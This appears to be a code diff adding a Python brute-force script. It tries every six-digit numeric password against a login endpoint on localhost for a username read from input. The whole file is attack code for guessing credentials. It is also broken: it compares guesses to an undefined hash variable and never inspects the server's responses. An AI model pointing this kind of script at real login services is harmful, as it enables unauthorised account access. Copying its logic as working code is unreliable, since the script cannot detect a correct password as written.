@@ -1,0 +1,35 @@
+import itertools
+import requests
+from tqdm import tqdm
+from datetime import datetime
+
+# brute force attack
+import uuid
+import hashlib
+
+import string
+
+
+def hash_password(text):
+    salt = uuid.uuid4().hex
+    return hashlib.sha256(salt.encode() + text.encode()).hexdigest() + ":" + salt
+
+
+def check_password(hashedText, providedText):
+    _hashedText, salt = hashedText.split(":")
+    return (
+        _hashedText == hashlib.sha256(salt.encode() + providedText.encode()).hexdigest()
+    )
+
+
+username = input()
+for x in list(itertools.product(string.digits, repeat=6)):
+    password = "".join(x)
+    res = requests.post(
+        "http://127.0.0.1:8000/login", json={"username": username, "password": password}
+    )
+    if check_password(hs, password):
+        print("found", password)
+        break
+    else:
+        print("not found", password, datetime.now())
